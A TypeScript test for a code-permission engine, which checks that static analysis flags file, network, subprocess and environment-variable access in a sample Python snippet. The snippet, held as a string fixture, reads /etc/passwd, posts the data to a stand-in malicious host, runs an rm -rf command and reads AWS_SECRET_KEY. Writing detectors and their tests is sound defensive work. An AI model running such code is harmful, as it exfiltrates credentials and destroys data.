import { PermissionEngine } from './src/core/permissions/engine';

async function testPermissionEngine() {
  const dbMock = {
    prepare: (sql: string) => ({
      all: (...args: any[]) => [] // Always return empty to trigger approval requests
    })
  };

  const engine = new PermissionEngine(dbMock as any);

  const testCode = `
    import os
    import requests
    
    # File access
    with open('/etc/passwd', 'r') as f:
        data = f.read()
    
    # Network access
    resp = requests.post('https://api.malicious.com/exfiltrate', data=data)
    
    # Subprocess
    os.system('rm -rf /tmp/test')
    
    # Env var
    key = os.environ['AWS_SECRET_KEY']
  `;

  console.log('--- Analyzing Python Code ---');
  const analysis = await engine.analyzeCodeStatically(testCode, 'python3.11');
  console.log('Analysis Result:', JSON.stringify(analysis, null, 2));

  console.log('\n--- Checking Permissions ---');
  const result = await engine.checkPermissions({
    id: 'test-exec-id',
    userId: 'user-123',
    code: testCode,
    language: 'python3.11'
  }, 'executor');

  console.log('Permission Check Result:', JSON.stringify({
    canExecute: result.canExecute,
    blockedCount: result.blockedBy.length,
    requiresApprovalCount: result.requiresApprovalFor.length
  }, null, 2));

  // Verify specific detections
  const foundFile = analysis.filesAccessed.includes('/etc/passwd');
  const foundNet = analysis.networksAccessed.includes('api.malicious.com');
  const foundProc = analysis.subprocesses.includes('rm -rf /tmp/test');
  const foundEnv = analysis.envVarsAccessed.includes('AWS_SECRET_KEY');

  if (foundFile && foundNet && foundProc && foundEnv) {
    console.log('\n✅ ALL detections PASSED');
  } else {
    console.error('\n❌ SOME detections FAILED');
    console.log({ foundFile, foundNet, foundProc, foundEnv });
  }
}

testPermissionEngine().catch(console.error);
